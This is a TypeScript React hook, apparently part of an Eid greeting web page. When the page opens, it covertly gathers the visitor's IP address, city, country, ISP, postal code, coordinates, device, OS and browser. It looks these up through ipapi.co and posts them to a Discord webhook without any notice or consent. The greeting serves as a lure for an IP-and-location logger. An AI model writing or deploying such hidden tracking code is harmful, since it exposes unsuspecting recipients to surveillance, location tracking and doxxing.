import { useEffect } from 'react';

interface VisitorInfo {
  ip: string;
  city: string;
  country_name: string;
  org: string;
  postal: string;
  latitude: number;
  longitude: number;
}

function parseUserAgent() {
  const ua = navigator.userAgent;

  let os = 'Unknown OS';
  if (/Windows NT/.test(ua)) os = 'Windows';
  else if (/Mac OS X/.test(ua)) os = 'macOS';
  else if (/Android/.test(ua)) os = 'Android';
  else if (/iPhone|iPad/.test(ua)) os = 'iOS';
  else if (/Linux/.test(ua)) os = 'Linux';

  let browser = 'Unknown Browser';
  if (/Edg\//.test(ua)) browser = 'Microsoft Edge';
  else if (/OPR\//.test(ua)) browser = 'Opera';
  else if (/Chrome\//.test(ua)) browser = 'Chrome';
  else if (/Firefox\//.test(ua)) browser = 'Firefox';
  else if (/Safari\//.test(ua)) browser = 'Safari';

  let device = 'Desktop';
  if (/Mobile|Android|iPhone|iPad/.test(ua)) device = 'Mobile';
  else if (/Tablet/.test(ua)) device = 'Tablet';

  

  return { os, browser, device };
}

export function useVisitorTracker() {
  useEffect(() => {
    const SESSION_KEY = 'eid_visitor_sent';
    if (sessionStorage.getItem(SESSION_KEY)) return;

    const webhookUrl = import.meta.env.VITE_DISCORD_WEBHOOK_URL as string;
    if (!webhookUrl || webhookUrl.includes('YOUR_WEBHOOK')) return;

    const { os, browser, device } = parseUserAgent();

    fetch('https://ipapi.co/json/')
      .then((res) => res.json())
      .then((data: VisitorInfo) => {
        const visitedAt = new Date().toLocaleString('id-ID', {
          timeZone: 'Asia/Jakarta',
          dateStyle: 'full',
          timeStyle: 'long',
        });

        const payload = {
          embeds: [
            {
              title: '🕌 Someone Opened Your Eid Greeting',
              color: 0xc9a84c,
              fields: [
                { name: '🌐 IP Address', value: data.ip || 'Unknown', inline: true },
                {
                  name: '📍 Location',
                  value: `${data.city || '?'}, ${data.country_name || '?'}`,
                  inline: true,
                },
                { name: '🏢 ISP', value: data.org || 'Unknown', inline: true },
                { name: '📮 Postal', value: data.postal || 'Unknown', inline: true },
                { name: '🗺️ Coordinates', value: `${data.latitude || '?'}, ${data.longitude || '?'}`, inline: true },
                { name: '💻 Device', value: device, inline: true },
                { name: '🖥️ OS', value: os, inline: true },
                { name: '🌍 Browser', value: browser, inline: true },
                { name: '🕐 Visited At', value: visitedAt, inline: false },
              ],
              footer: { text: 'Eid Mubarak 1447 H — Team AAA' },
            },
          ],
        };

        return fetch(webhookUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload),
        });
      })
      .then(() => {
        sessionStorage.setItem(SESSION_KEY, '1');
      })
      .catch(() => {

      });
  }, []);
}
